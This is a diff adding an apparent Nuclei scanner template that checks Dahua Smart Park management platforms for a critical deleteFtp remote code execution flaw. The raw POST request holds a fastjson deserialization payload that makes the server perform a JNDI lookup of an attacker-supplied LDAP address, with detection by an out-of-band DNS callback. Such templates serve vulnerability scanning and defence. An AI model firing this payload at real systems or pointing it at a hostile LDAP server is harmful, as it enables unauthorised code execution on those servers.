@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+      matchers-condition: and
+      raw:
+        - |
+          POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+          Content-Type: application/json
+          Accept-Encoding: gzip
+          SL-CE-SUID: 1063
+
+          {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/e","autoCommit":true}}}
+id: dahua-smart-park-deleteftp-rce
+info:
+    author: SleepingBag945
+    name: 大华智慧园区综合管理平台 deleteFtp RCE
+    severity: critical
+    tags:
+        - dahua
+        - ecor
+        - ECOR
+        - 大华智慧园区综合管理平台
